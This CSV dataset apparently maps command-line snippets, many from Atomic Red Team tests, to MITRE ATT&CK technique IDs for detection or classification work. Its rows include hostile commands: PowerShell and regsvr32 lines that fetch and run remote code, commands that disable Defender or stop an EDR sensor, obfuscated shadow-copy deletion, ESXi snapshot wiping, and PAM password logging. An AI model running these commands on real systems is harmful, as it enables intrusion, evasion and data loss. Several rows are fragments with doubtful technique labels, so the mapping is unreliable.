command,mitre_id
IKEEXT,T1543
"if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH""; fi",T1562
"if($error) {echo ""Virtualization Environment detected""}",T1497
Microsoft.Compute/snapshots/delete,T1490
nltest.exe /dclist,T1018
sudo systemctl stop falcon-sensor.service,T1562
"reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""",T1012
Install-TransportAgent -Name $transport_agent_identity -TransportAgentFactory $class_factory -AssemblyPath $dll_path,T1505
"""$winzip_exe"" -min -a -s""hello"" archive.zip *",T1560
NtQueryInformationProcess(),T1574
foreach($user in $users),T1552
%windir%,T1055
DYLD_INSERT_LIBRARIES,T1574
cat /etc/login.defs,T1201
sfile,T1083
explorer.exe,T1134
Start-Process $powershell_command,T1564
"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done",T1070
"enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so",T1056
ping %REMOTE_HOST%,T1018
"ssh -o ProxyCommand=""{CMD}"" .",T1202
exec_32.dll,T1036
C:/Program Files(x86)/AnyDesk/AnyDesk.exe,T1219
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -Value '""C:\Windows\System32\mshta.exe"" http://localhost/hello6.hta'",T1204
DownloadString,T1047
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,T1055
"Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1",T1098
StartType = $p.Start,T1007
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue,T1547
WMI,T1021
else {,T1016
ps ax | grep <name> | grep -v grep | ...,T1057
"$word.run(""AutoExec"")",T1137
print /D:$path\file.txt:autoruns.exe $path\Autoruns.exe,T1564
"get-process | ?{$_.Description -like ""*cylance*""}",T1518
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1,T1036
HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\,T1112
cmd /c start /b tasklist,T1057
cmd.exe /C net user,T1574
WriteAllBytes,T1105
"Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append $File_to_output",T1083
"""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI""",T1012
powerSQL -noninteractive -consoleoutput,T1518
tmp/dsserver-check.statementcounters,T1074
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,T1218
"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso"" -OutFile ""$env:TEMP\qbot-test.iso"")",T1204
%APPDATA%,T1564
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
"gcloud iam roles create $role-name --description=""$role-description"" --permissions=$roles --project=$project-id",T1078
"net localgroup ""adminstrator""",T1069
"Write-Host ""Exfiltrating data... "" -NoNewLine",T1567
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",T1547
"stop-process -name ""cmd"" | out-null",T1036
tasklist.exe,T1518
sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net,T1543
"cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2L:1""",T1569
cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,T1564
GetPrintProcessorDirectory,T1547
LoadLibraryW,T1106
if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null },T1562
del /f $file_to_delete,T1070
"Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction",T1053
sessionGopher -noninteractive -consoleoutput,T1552
cmd /c,T1059
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},T1127
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,T1218
Test-NetConnection -ComputerName $target,T1016
net start >> %TEMP%\info.dat,T1007
"adplus.exe -crash -o ""{PATH_ABSOLUTE:folder}"" -sc {PATH:.exe}",T1127
tar -cvzf $output_file $input_file_folder,T1560
wscript.exe,T1216
Remove-AzEventHub -ResourceGroupName $resource_group -Namespace $name_space_name -Name $event_hub_name,T1562
"reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\$payload"" /f",T1053
"rundll32.exe -sta ""AtomicTest""",T1546
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');,T1059
net user $user_account $new_user_password /add,T1531
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""",T1485
taskkill -f -im calc.exe,T1218
netsh wlan show networks mode=bssid,T1016
function Scan-Dir($root) {,T1083
C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete,T1027
NtSetInformationProcess,T1106
Start-Sleep -Seconds 3,T1562
StopUserModeBrowserInjection,T1036
